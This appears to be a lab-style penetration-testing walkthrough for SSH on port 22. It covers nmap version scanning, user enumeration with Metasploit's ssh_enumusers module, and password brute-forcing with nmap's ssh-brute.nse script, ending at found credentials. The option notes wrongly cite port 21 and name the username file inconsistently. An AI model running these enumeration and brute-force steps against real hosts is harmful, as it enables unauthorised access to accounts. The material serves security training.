# Port 22 SSH

## 📄 Step: 1. Scanning for SSH vulnurabilty through nmap built-in script.

    nmap **Target-IP** -p 22 -sV -sC

  -  nmap Target-IP #basic usage of nmap
  - -p 22 #search for port 22 only
  - -sV #Finds service version
  - -sC #uses default nmap scripts to find vuln

✅ The machine seems to be running OpenSSH-4.7p1.

<img width="874" height="548" alt="4 SSH-Scan" src="https://github.com/user-attachments/assets/06642d7a-bfb5-4361-b953-1ea4c14a5625" />


## ⚙️ STEP: 1. User Enumration through Metasploit ssh_enumusers auxiliary scanner.

The ssh_enumusers module in Metasploit is an auxiliary scanner designed to enumerate valid 
usernames on a target OpenSSH server by exploiting malformed packets or timing attacks

👉 In Terminal type-

    msfconsole
    search openssh 
    use auxiliary/scanner/ssh/ssh_enumusers
    set RHOSTS **Target-IP**
    run

<img width="1112" height="409" alt="5 SSH-enum" src="https://github.com/user-attachments/assets/d8edd864-abbe-445b-a39f-2220594d8e77" />

👇 These are the result of the username scanner,
save these usernames in a UserNames.txt.

<img width="502" height="163" alt="6 User-Found" src="https://github.com/user-attachments/assets/9734cf7d-c432-4713-a663-1d8c6aeb22b3" />

## 📄 Step: 2. Use nmap built-in ssh-brute.nse script to find passwords for users.

👉 In Terminal Type-

    nmap --script ssh-brute.nse -p 22 **Target-IP** --script-args userdb=**UserName.txt**,brute.firstonly

 - --script ssh-brute.nse #Specify the ssh-brute.nse script
 - -p 21 **Target-Ip** #Specify Target-IP and the port 21 
 - --script-args #Specify the arguments for the scripts
 - userdb=**UserName.txt** #Specify the username list
 - brute.firstonly # #Tells nmap to stop after finding one successfull credential 

## 🔥 Credentials Found

<img width="829" height="509" alt="8 Success-Brute" src="https://github.com/user-attachments/assets/1d933049-9cf5-4962-acda-17eb8284dc64" />

    





